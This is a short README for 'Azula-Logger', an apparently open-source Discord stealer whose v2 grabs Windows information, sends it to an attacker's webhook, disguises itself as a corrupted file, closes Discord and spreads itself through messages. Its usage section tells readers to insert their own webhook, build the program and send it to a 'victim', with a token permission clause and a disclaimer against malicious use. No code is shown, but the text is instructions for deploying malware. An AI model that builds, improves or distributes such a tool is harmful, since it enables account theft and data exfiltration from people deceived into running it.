# Azula-Logger
azula logger v2 by dxmon and chefkoch

Added in v2: 

Windows info grabbing

Made the webhook message look better

Made it look like a corupted file

Made it close discord for things in the future

Chefkoch (me) and dxmon would be very happy if you fork this Repo and make the code better

# Usage

You download the source code and modify it with your webhook, picture and message

webhook and picture: Program.cs

message: Spreader.cs

You Build the Source 

And send it to your victim (that gave you permission to do that)

# Legality

Me and dxmon dont take any warranty for what you do with this tool

Dont use it for Malicius Purposes!

This is just an example to show that discord isn't as secure as you think
